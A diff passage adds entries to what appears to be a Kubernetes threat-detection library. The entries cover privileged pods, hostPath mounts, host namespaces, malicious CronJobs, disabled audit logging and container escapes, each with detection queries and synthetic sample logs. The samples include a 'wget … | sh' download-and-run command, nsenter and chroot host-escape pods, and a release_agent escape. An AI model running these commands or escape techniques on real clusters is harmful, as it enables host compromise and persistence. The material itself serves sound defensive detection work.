+        "id": "T1610",
+        "name": "Deploy Container"
+      },
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      }
+    ],
+    "description": "A pod (or workload template) was created with securityContext.privileged=true or allowPrivilegeEscalation=true outside approved system namespaces. Privileged containers have full access to host devices and are one step from host compromise.",
+    "detection": "source=k8s_audit objectRef.resource=\"pods\" verb=\"create\" | spath requestObject.spec.containers{}.securityContext.privileged AS priv | where priv=\"true\" AND objectRef.namespace NOT IN (\"kube-system\",\"calico-system\",\"falco\")",
+    "falsePositives": "CNI, CSI and security agents (Falco, Cilium, node-exporter) that legitimately run privileged.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "c0d1e2f3-a4b5-4c6d-8e75-8091a2b3c4d5",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/default/pods",
+      "verb": "create",
+      "user": {
+        "username": "jdoe@corp.example",
+        "groups": [
+          "platform-devs",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (darwin/arm64)",
+      "objectRef": {
+        "resource": "pods",
+        "namespace": "default",
+        "name": "debug-tools",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "kind": "Pod",
+        "metadata": {
+          "name": "debug-tools",
+          "namespace": "default"
+        },
+        "spec": {
+          "containers": [
+            {
+              "name": "shell",
+              "image": "docker.io/library/ubuntu:22.04",
+              "command": [
+                "sleep",
+                "infinity"
+              ],
+              "securityContext": {
+                "privileged": true
+              }
+            }
+          ]
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T09:15:33.441270Z",
+      "annotations": {
+        "pod-security.kubernetes.io/audit-violations": "would violate PodSecurity \"baseline:latest\": privileged (container \"shell\" must not set securityContext.privileged=true)"
+      }
+    }
+  },
+  {
+    "id": "KSU-017",
+    "name": "Sensitive hostPath Volume Mounted",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 85,
+    "logSources": [
+      "Kubernetes Audit Log",
+      "Admission Controller (Kyverno / OPA Gatekeeper / PSA)"
+    ],
+    "tactics": [
+      "Privilege Escalation",
+      "Credential Access"
+    ],
+    "mitre": [
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      },
+      {
+        "id": "T1552.001",
+        "name": "Unsecured Credentials: Credentials In Files"
+      }
+    ],
+    "description": "A pod mounts a sensitive host directory: /, /etc, /root, /proc, /var/lib/kubelet, /etc/kubernetes, /var/run/docker.sock or /run/containerd/containerd.sock. This gives direct read/write access to node credentials and the container runtime.",
+    "detection": "source=k8s_audit objectRef.resource=\"pods\" verb=\"create\" | spath requestObject.spec.volumes{}.hostPath.path AS hp | where hp IN (\"/\",\"/etc\",\"/root\",\"/proc\",\"/var/lib/kubelet\",\"/etc/kubernetes\",\"/var/run/docker.sock\",\"/run/containerd/containerd.sock\") ",
+    "falsePositives": "Log shippers (Fluent Bit mounting /var/log), node-exporter (/proc, /sys), CSI drivers.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "d1e2f3a4-b5c6-4d7e-9f86-91a2b3c4d5e6",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/web/pods",
+      "verb": "create",
+      "user": {
+        "username": "system:serviceaccount:web:frontend",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.2.41"
+      ],
+      "userAgent": "kubectl/v1.30.0 (linux/amd64)",
+      "objectRef": {
+        "resource": "pods",
+        "namespace": "web",
+        "name": "node-shell",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "kind": "Pod",
+        "spec": {
+          "containers": [
+            {
+              "name": "x",
+              "image": "alpine:3.20",
+              "command": [
+                "chroot",
+                "/host",
+                "sh"
+              ],
+              "volumeMounts": [
+                {
+                  "name": "hostroot",
+                  "mountPath": "/host"
+                }
+              ]
+            }
+          ],
+          "volumes": [
+            {
+              "name": "hostroot",
+              "hostPath": {
+                "path": "/",
+                "type": "Directory"
+              }
+            }
+          ]
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T13:09:02.807511Z"
+    }
+  },
+  {
+    "id": "KSU-018",
+    "name": "Pod Using Host Namespaces (hostPID / hostNetwork / hostIPC)",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 78,
+    "logSources": [
+      "Kubernetes Audit Log",
+      "Admission Controller (Kyverno / OPA Gatekeeper / PSA)"
+    ],
+    "tactics": [
+      "Privilege Escalation",
+      "Discovery"
+    ],
+    "mitre": [
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery"
+      }
+    ],
+    "description": "A pod requests hostPID, hostNetwork or hostIPC. hostPID allows nsenter into PID 1 and reading other processes' environments; hostNetwork exposes node interfaces and bypasses NetworkPolicy.",
+    "detection": "source=k8s_audit objectRef.resource=\"pods\" verb=\"create\" (requestObject.spec.hostPID=true OR requestObject.spec.hostNetwork=true OR requestObject.spec.hostIPC=true) | where objectRef.namespace NOT IN (system_namespaces)",
+    "falsePositives": "kube-proxy, CNI daemonsets, node monitoring agents, ingress controllers using hostNetwork.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "e2f3a4b5-c6d7-4e8f-8a97-a2b3c4d5e6f7",
+      "stage": "ResponseComplete",
+      "requestURI": "/api/v1/namespaces/default/pods",
+      "verb": "create",
+      "user": {
+        "username": "jdoe@corp.example",
+        "groups": [
+          "platform-devs",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (darwin/arm64)",
+      "objectRef": {
+        "resource": "pods",
+        "namespace": "default",
+        "name": "nsenter-0",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "kind": "Pod",
+        "spec": {
+          "hostPID": true,
+          "hostNetwork": true,
+          "containers": [
+            {
+              "name": "n",
+              "image": "alpine:3.20",
+              "command": [
+                "nsenter",
+                "-t",
+                "1",
+                "-m",
+                "-u",
+                "-i",
+                "-n",
+                "sh"
+              ],
+              "securityContext": {
+                "privileged": true
+              }
+            }
+          ]
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T09:21:48.120449Z"
+    }
+  },
+  {
+    "id": "KSU-019",
+    "name": "Dangerous Linux Capabilities Added to Container",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 75,
+    "logSources": [
+      "Kubernetes Audit Log",
+      "Admission Controller (Kyverno / OPA Gatekeeper / PSA)"
+    ],
+    "tactics": [
+      "Privilege Escalation"
+    ],
+    "mitre": [
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      },
+      {
+        "id": "T1068",
+        "name": "Exploitation for Privilege Escalation"
+      }
+    ],
+    "description": "Container securityContext.capabilities.add contains SYS_ADMIN, SYS_PTRACE, SYS_MODULE, DAC_READ_SEARCH, NET_ADMIN, NET_RAW or BPF. These capabilities enable known container escape techniques (cgroup release_agent, ptrace injection, kernel module loading).",
+    "detection": "source=k8s_audit objectRef.resource=\"pods\" verb=\"create\" | spath requestObject.spec.containers{}.securityContext.capabilities.add{} AS caps | where caps IN (\"SYS_ADMIN\",\"SYS_PTRACE\",\"SYS_MODULE\",\"DAC_READ_SEARCH\",\"NET_ADMIN\",\"BPF\",\"ALL\")",
+    "falsePositives": "eBPF-based observability/security tools (Cilium, Falco, Pixie), VPN sidecars needing NET_ADMIN.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "f3a4b5c6-d7e8-4f9a-9ba8-b3c4d5e6f7a8",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/apps/v1/namespaces/analytics/deployments",
+      "verb": "create",
+      "user": {
+        "username": "ml-team@corp.example",
+        "groups": [
+          "data-science",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.90"
+      ],
+      "userAgent": "helm/v3.15.2",
+      "objectRef": {
+        "resource": "deployments",
+        "namespace": "analytics",
+        "name": "notebook",
+        "apiGroup": "apps",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "spec": {
+          "template": {
+            "spec": {
+              "containers": [
+                {
+                  "name": "jupyter",
+                  "image": "quay.io/jupyter/base-notebook:2026-09",
+                  "securityContext": {
+                    "capabilities": {
+                      "add": [
+                        "SYS_ADMIN",
+                        "SYS_PTRACE"
+                      ]
+                    }
+                  }
+                }
+              ]
+            }
+          }
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T10:05:17.660231Z"
+    }
+  },
+  {
+    "id": "KSU-020",
+    "name": "Workload Deployed to kube-system by Non-System Identity",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 80,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Defense Evasion",
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Name or Location"
+      },
+      {
+        "id": "T1610",
+        "name": "Deploy Container"
+      }
+    ],
+    "description": "Pods, Deployments or DaemonSets created in kube-system by a human user or a non-system service account, often with names mimicking legitimate components (kube-proxy-x, coredns-helper). Attackers hide in kube-system because it is rarely reviewed.",
+    "detection": "source=k8s_audit objectRef.namespace=\"kube-system\" verb=\"create\" objectRef.resource IN (\"pods\",\"deployments\",\"daemonsets\",\"replicasets\",\"jobs\") | where user.username NOT LIKE \"system:*\" AND user.username NOT IN (platform_gitops_sa)",
+    "falsePositives": "Platform engineers installing add-ons via Helm directly (should go through GitOps).",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "a4b5c6d7-e8f9-4a0b-8cb9-c4d5e6f7a8b9",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/apps/v1/namespaces/kube-system/deployments",
+      "verb": "create",
+      "user": {
+        "username": "contractor01@corp.example",
+        "groups": [
+          "contractors",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "deployments",
+        "namespace": "kube-system",
+        "name": "coredns-autoscaler-helper",
+        "apiGroup": "apps",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "spec": {
+          "template": {
+            "spec": {
+              "serviceAccountName": "coredns",
+              "containers": [
+                {
+                  "name": "helper",
+                  "image": "ghcr.io/k8s-utils-dev/helper:latest"
+                }
+              ]
+            }
+          }
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T21:44:06.190557Z"
+    }
+  },
+  {
+    "id": "KSU-021",
+    "name": "Suspicious CronJob Created",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 74,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+    ],
+    "mitre": [
+      {
+        "id": "T1053.007",
+        "name": "Scheduled Task/Job: Container Orchestration Job"
+      }
+    ],
+    "description": "A CronJob is created or modified with a high-frequency schedule, an image from an unapproved registry, a shell/curl/wget command, or in a system namespace. CronJobs provide stealthy recurring execution and persistence.",
+    "detection": "source=k8s_audit objectRef.resource=\"cronjobs\" verb IN (\"create\",\"update\",\"patch\") | spath requestObject.spec.jobTemplate.spec.template.spec.containers{}.command{} AS cmd | where match(cmd, \"(curl|wget|sh -c|bash -c|base64|nc )\") OR objectRef.namespace=\"kube-system\" OR requestObject.spec.schedule=\"* * * * *\"",
+    "falsePositives": "Backup, report and cleanup CronJobs using shell wrappers; tune by image allow-list.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "b5c6d7e8-f9a0-4b1c-9dca-d5e6f7a8b9c0",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/batch/v1/namespaces/kube-system/cronjobs",
+      "verb": "create",
+      "user": {
+        "username": "system:serviceaccount:dev:ci-runner",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.3.17"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "cronjobs",
+        "namespace": "kube-system",
+        "name": "log-rotate",
+        "apiGroup": "batch",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "spec": {
+          "schedule": "*/5 * * * *",
+          "jobTemplate": {
+            "spec": {
+              "template": {
+                "spec": {
+                  "containers": [
+                    {
+                      "name": "r",
+                      "image": "alpine:3.20",
+                      "command": [
+                        "sh",
+                        "-c",
+                        "wget -qO- http://198.51.100.66/s.sh | sh"
+                      ]
+                    }
+                  ]
+                }
+              }
+            }
+          }
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T22:10:41.500128Z"
+    }
+  },
+  {
+    "id": "KSU-022",
+    "name": "DaemonSet Created or Modified (Cluster-Wide Persistence)",
+    "category": "Workload Configuration",
+    "severity": "High",
+    "confidence": 70,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Persistence",
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1543.005",
+        "name": "Create or Modify System Process: Container Service"
+      },
+      {
+        "id": "T1610",
+        "name": "Deploy Container"
+      }
+    ],
+    "description": "A new DaemonSet, or an image/command change to an existing one, outside the GitOps pipeline. DaemonSets run on every node (including new ones), giving attackers instant cluster-wide persistence — commonly used to deploy miners.",
+    "detection": "source=k8s_audit objectRef.resource=\"daemonsets\" verb IN (\"create\",\"update\",\"patch\") responseStatus.code < 400 | where user.username NOT IN (gitops_service_accounts) | table requestReceivedTimestamp, user.username, objectRef.namespace, objectRef.name, requestObject.spec.template.spec.containers{}.image",
+    "falsePositives": "Add-on installs/upgrades (logging, monitoring, CNI) performed manually.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "RequestResponse",
+      "auditID": "c6d7e8f9-a0b1-4c2d-8edb-e6f7a8b9c0d1",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/apps/v1/namespaces/monitoring/daemonsets",
+      "verb": "create",
+      "user": {
+        "username": "system:serviceaccount:dev:ci-runner",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.3.17"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "daemonsets",
+        "namespace": "monitoring",
+        "name": "node-metrics-agent",
+        "apiGroup": "apps",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 201
+      },
+      "requestObject": {
+        "spec": {
+          "template": {
+            "spec": {
+              "tolerations": [
+                {
+                  "operator": "Exists"
+                }
+              ],
+              "containers": [
+                {
+                  "name": "agent",
+                  "image": "docker.io/metricsx/agent:2.1",
+                  "resources": {
+                    "limits": {
+                      "cpu": "4"
+                    }
+                  }
+                }
+              ]
+            }
+          }
+        }
+      },
+      "requestReceivedTimestamp": "2026-10-02T22:31:55.712004Z"
+    }
+  },
+  {
+    "id": "KSU-023",
+    "name": "Admission Webhook or Policy Engine Deleted / Weakened",
+    "category": "Defense Evasion",
+    "severity": "High",
+    "confidence": 84,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1562.001",
+        "name": "Impair Defenses: Disable or Modify Tools"
+      }
+    ],
+    "description": "Deletion or modification of ValidatingWebhookConfiguration / MutatingWebhookConfiguration objects, Kyverno/Gatekeeper policies, failurePolicy changed to Ignore, or the Pod Security Admission label on a namespace lowered to privileged.",
+    "detection": "source=k8s_audit ((objectRef.resource IN (\"validatingwebhookconfigurations\",\"mutatingwebhookconfigurations\",\"clusterpolicies\",\"constrainttemplates\") verb IN (\"delete\",\"update\",\"patch\")) OR (objectRef.resource=\"namespaces\" verb IN (\"update\",\"patch\") requestObject.metadata.labels.\"pod-security.kubernetes.io/enforce\"=\"privileged\")) | where user.username NOT IN (policy_operator_sa)",
+    "falsePositives": "Policy engine upgrades; cert rotation rewriting caBundle on webhooks (filter caBundle-only patches).",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "d7e8f9a0-b1c2-4d3e-9fec-f7a8b9c0d1e2",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations/kyverno-resource-validating-webhook-cfg",
+      "verb": "delete",
+      "user": {
+        "username": "jdoe@corp.example",
+        "groups": [
+          "platform-devs",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (darwin/arm64)",
+      "objectRef": {
+        "resource": "validatingwebhookconfigurations",
+        "name": "kyverno-resource-validating-webhook-cfg",
+        "apiGroup": "admissionregistration.k8s.io",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T23:05:12.044390Z"
+    }
+  },
+  {
+    "id": "KSU-024",
+    "name": "NetworkPolicy Deleted or Default-Deny Removed",
+    "category": "Defense Evasion",
+    "severity": "Medium",
+    "confidence": 70,
+    "logSources": [
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1562.007",
+        "name": "Impair Defenses: Disable or Modify Cloud Firewall"
+      }
+    ],
+    "description": "NetworkPolicy, CiliumNetworkPolicy or Calico GlobalNetworkPolicy objects deleted or modified to allow all ingress/egress — removes segmentation to enable lateral movement or exfiltration.",
+    "detection": "source=k8s_audit objectRef.resource IN (\"networkpolicies\",\"ciliumnetworkpolicies\",\"globalnetworkpolicies\") verb IN (\"delete\",\"deletecollection\",\"patch\",\"update\") | where user.username NOT IN (gitops_service_accounts)",
+    "falsePositives": "Application teams iterating on policies in non-production namespaces.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "e8f9a0b1-c2d3-4e4f-8a0d-a8b9c0d1e2f3",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/networking.k8s.io/v1/namespaces/payments/networkpolicies/default-deny-egress",
+      "verb": "delete",
+      "user": {
+        "username": "contractor01@corp.example",
+        "groups": [
+          "contractors",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "203.0.113.45"
+      ],
+      "userAgent": "kubectl/v1.31.2 (linux/amd64)",
+      "objectRef": {
+        "resource": "networkpolicies",
+        "namespace": "payments",
+        "name": "default-deny-egress",
+        "apiGroup": "networking.k8s.io",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "code": 200
+      },
+      "requestReceivedTimestamp": "2026-10-02T23:20:47.231876Z"
+    }
+  },
+  {
+    "id": "KSU-025",
+    "name": "Control-Plane Audit Logging Disabled (EKS / AKS / GKE)",
+    "category": "Defense Evasion",
+    "severity": "Critical",
+    "confidence": 92,
+    "logSources": [
+      "Cloud Audit Logs (CloudTrail / Azure Activity / GCP Audit)"
+    ],
+    "tactics": [
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1562.008",
+        "name": "Impair Defenses: Disable or Modify Cloud Logs"
+      }
+    ],
+    "description": "Managed Kubernetes control-plane logging (api, audit, authenticator) was disabled: EKS UpdateClusterConfig with enabled=false, AKS diagnostic setting deleted, or GKE logging component removed. Blinds every audit-based detection in this library.",
+    "detection": "(source=aws:cloudtrail eventSource=\"eks.amazonaws.com\" eventName=\"UpdateClusterConfig\" requestParameters.logging.clusterLogging{}.enabled=false) OR (source=azure:activity operationName=\"MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE\" resourceId=\"*managedClusters*\") OR (source=gcp:audit methodName=\"google.container.v1.ClusterManager.UpdateCluster\" request.update.desiredLoggingConfig=*)",
+    "falsePositives": "Cost-reduction changes in sandbox accounts (should be change-managed).",
+    "sampleLog": {
+      "eventVersion": "1.09",
+      "userIdentity": {
+        "type": "AssumedRole",
+        "arn": "arn:aws:sts::111122223333:assumed-role/DevOpsRole/jdoe",
+        "accountId": "111122223333"
+      },
+      "eventTime": "2026-10-02T23:58:02Z",
+      "eventSource": "eks.amazonaws.com",
+      "eventName": "UpdateClusterConfig",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.23",
+      "userAgent": "aws-cli/2.17.40 Python/3.11.9 Linux/6.8.0",
+      "requestParameters": {
+        "name": "prod-eks",
+        "logging": {
+          "clusterLogging": [
+            {
+              "types": [
+                "api",
+                "audit",
+                "authenticator",
+                "controllerManager",
+                "scheduler"
+              ],
+              "enabled": false
+            }
+          ]
+        }
+      },
+      "responseElements": {
+        "update": {
+          "id": "8c3b1a2d-4e5f-6a7b-8c9d-0e1f2a3b4c5d",
+          "status": "InProgress",
+          "type": "LoggingUpdate"
+        }
+      },
+      "eventType": "AwsApiCall",
+      "recipientAccountId": "111122223333"
+    }
+  },
+  {
+    "id": "KSU-026",
+    "name": "Image from Untrusted or Public Registry Deployed",
+    "category": "Supply Chain",
+    "severity": "Medium",
+    "confidence": 70,
+    "logSources": [
+      "Kubernetes Audit Log",
+      "Kubelet Logs"
+    ],
+    "tactics": [
+      "Execution",
+      "Persistence"
+    ],
+    "mitre": [
+      {
+        "id": "T1204.003",
+        "name": "User Execution: Malicious Image"
+      },
+      {
+        "id": "T1525",
+        "name": "Implant Internal Image"
+      }
+    ],
+    "description": "A workload references an image outside the approved registry allow-list (e.g. docker.io personal namespaces, ghcr.io unknown orgs, raw IPs), or uses a mutable :latest tag without a digest in production.",
+    "detection": "source=k8s_audit objectRef.resource IN (\"pods\",\"deployments\",\"daemonsets\",\"statefulsets\",\"cronjobs\",\"jobs\") verb IN (\"create\",\"patch\",\"update\") | spath output=img path=requestObject..image | where NOT match(img, \"^(123456789012\\.dkr\\.ecr\\..*|registry\\.corp\\.example/|registry\\.k8s\\.io/)\")",
+    "falsePositives": "Developers testing public images in sandbox namespaces; vendor images from new registries.",
+    "sampleLog": "I1002 07:44:18.902117    2214 kuberuntime_manager.go:1040] \"Pulling image\" pod=\"web/frontend-5f7d8c9b6-zt4kq\" containerName=\"sidecar\" image=\"docker.io/xmr-opt/helper:latest\"\nI1002 07:44:23.551908    2214 kuberuntime_image.go:62] \"Successfully pulled image\" image=\"docker.io/xmr-opt/helper:latest\" pod=\"web/frontend-5f7d8c9b6-zt4kq\" imageSize=\"38.1MB\" duration=\"4.65s\""
+  },
+  {
+    "id": "KSU-027",
+    "name": "Image Signature or Admission Policy Verification Failure",
+    "category": "Supply Chain",
+    "severity": "High",
+    "confidence": 85,
+    "logSources": [
+      "Admission Controller (Kyverno / OPA Gatekeeper / PSA)",
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Initial Access",
+      "Persistence"
+    ],
+    "mitre": [
+      {
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain"
+      },
+      {
+        "id": "T1525",
+        "name": "Implant Internal Image"
+      }
+    ],
+    "description": "An admission controller (Kyverno verifyImages, Sigstore policy-controller, Connaisseur, Ratify) rejected or audited an image whose Cosign/Notary signature or attestation is missing or invalid — possibly a tampered image in an internal registry.",
+    "detection": "(source=kyverno policyReport.results{}.result=\"fail\" policyReport.results{}.policy=\"verify-image-signatures\") OR (source=k8s_audit responseStatus.code=400 responseStatus.message=\"*image signature verification failed*\")",
+    "falsePositives": "New images pushed before the signing step completed in CI; key rotation.",
+    "sampleLog": {
+      "kind": "Event",
+      "apiVersion": "audit.k8s.io/v1",
+      "level": "Metadata",
+      "auditID": "f9a0b1c2-d3e4-4f5a-9b1e-b9c0d1e2f3a4",
+      "stage": "ResponseComplete",
+      "requestURI": "/apis/apps/v1/namespaces/payments/deployments",
+      "verb": "create",
+      "user": {
+        "username": "system:serviceaccount:argocd:argocd-application-controller",
+        "groups": [
+          "system:serviceaccounts",
+          "system:authenticated"
+        ]
+      },
+      "sourceIPs": [
+        "10.244.0.12"
+      ],
+      "objectRef": {
+        "resource": "deployments",
+        "namespace": "payments",
+        "name": "payments-api",
+        "apiGroup": "apps",
+        "apiVersion": "v1"
+      },
+      "responseStatus": {
+        "metadata": {},
+        "status": "Failure",
+        "message": "admission webhook \"mutate.kyverno.svc-fail\" denied the request: policy Deployment/payments/payments-api for resource violation: verify-image-signatures: autogen-check-signature: 'failed to verify image registry.corp.example/payments/api:3.4.1: .attestors[0].entries[0].keys: no matching signatures'",
+        "code": 400
+      },
+      "requestReceivedTimestamp": "2026-10-02T06:30:19.004421Z"
+    }
+  },
+  {
+    "id": "KSU-028",
+    "name": "Interactive Shell Spawned in Container",
+    "category": "Container Runtime",
+    "severity": "Medium",
+    "confidence": 70,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "EDR / Linux auditd"
+    ],
+    "tactics": [
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell"
+      },
+      {
+        "id": "T1609",
+        "name": "Container Administration Command"
+      }
+    ],
+    "description": "A shell (sh, bash, ash, zsh) with an attached TTY started inside a container, either through kubectl exec or spawned by the application process (e.g. java → sh) indicating remote code execution.",
+    "detection": "source=falco rule=\"Terminal shell in container\" OR (evt.type=execve AND container.id!=host AND proc.name IN (sh,bash,ash,zsh) AND proc.pname IN (java,node,python,php-fpm,nginx,httpd))",
+    "falsePositives": "Debugging sessions by operators, init scripts using sh -c (no TTY).",
+    "sampleLog": {
+      "time": "2026-10-02T16:48:04.118540Z",
+      "rule": "Terminal shell in container",
+      "priority": "Notice",
+      "source": "syscall",
+      "output": "A shell was spawned in a container with an attached terminal (evt_type=execve user=root user_uid=0 process=sh proc_exepath=/bin/busybox parent=runc command=sh terminal=34816 exe_flags=EXE_WRITABLE container_id=8f3c2e1a9b7d k8s_ns=payments k8s_pod=payments-api-6c9f7d8b5-qv7lm)",
+      "output_fields": {
+        "container.id": "8f3c2e1a9b7d",
+        "container.image.repository": "registry.corp.example/payments/api",
+        "evt.type": "execve",
+        "k8s.ns.name": "payments",
+        "k8s.pod.name": "payments-api-6c9f7d8b5-qv7lm",
+        "proc.cmdline": "sh",
+        "proc.pname": "runc",
+        "proc.tty": 34816,
+        "user.name": "root"
+      },
+      "hostname": "worker-node-02",
+      "tags": [
+        "container",
+        "maturity_stable",
+        "mitre_execution",
+        "shell",
+        "T1059"
+      ]
+    }
+  },
+  {
+    "id": "KSU-029",
+    "name": "Container Escape Attempt (nsenter / release_agent / host mount)",
+    "category": "Container Runtime",
+    "severity": "Critical",
+    "confidence": 90,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "EDR / Linux auditd"
+    ],
+    "tactics": [
+      "Privilege Escalation"
+    ],
+    "mitre": [
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      }
+    ],
+    "description": "Behaviour associated with breaking out of a container: nsenter targeting PID 1, writes to cgroup release_agent / notify_on_release, mounting host block devices, chroot to a host mount, or exploiting runc (/proc/self/exe overwrite).",
+    "detection": "source=falco rule IN (\"Detect release_agent File Container Escapes\",\"Mount Launched in Privileged Container\",\"Change namespace privileges via unshare\") OR (container.id!=host AND proc.name=\"nsenter\" AND proc.args LIKE \"*-t 1*\") OR (evt.type=open AND fd.name ENDS_WITH \"release_agent\")",
+    "falsePositives": "Node debugging tools (kubectl debug node/…, node-shell) used by administrators.",
+    "sampleLog": {
+      "time": "2026-10-02T09:22:10.774329Z",
+      "rule": "Detect release_agent File Container Escapes",
+      "priority": "Critical",
+      "source": "syscall",
+      "output": "Detect an attempt to exploit a container escape using release_agent file (file=/tmp/cgrp/release_agent fd.name=/tmp/cgrp/release_agent user=root user_loginuid=-1 cap_effective=CAP_SYS_ADMIN evt_type=openat process=sh command=sh -c echo /cmd > /tmp/cgrp/release_agent container_id=2b9d1e7c4a6f image=alpine)",
+      "output_fields": {
+        "container.id": "2b9d1e7c4a6f",
+        "container.image.repository": "alpine",
+        "fd.name": "/tmp/cgrp/release_agent",
+        "k8s.ns.name": "default",
+        "k8s.pod.name": "nsenter-0",
+        "proc.cmdline": "sh -c echo /cmd > /tmp/cgrp/release_agent",
+        "thread.cap_effective": "CAP_SYS_ADMIN",
+        "user.name": "root"
+      },
+      "hostname": "worker-node-03",
+      "tags": [
+        "container",
+        "maturity_stable",
+        "mitre_privilege_escalation",
+        "T1611"
+      ]
+    }
+  },
+  {
+    "id": "KSU-030",
+    "name": "Cryptomining Activity in Container",
+    "category": "Container Runtime",
+    "severity": "High",
+    "confidence": 90,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "DNS Logs (CoreDNS)",
+      "CNI Flow Logs (Cilium Hubble / Calico)"
+    ],
+    "tactics": [
+      "Impact"
+    ],
+    "mitre": [
+      {
+        "id": "T1496",
+        "name": "Resource Hijacking"
+      }
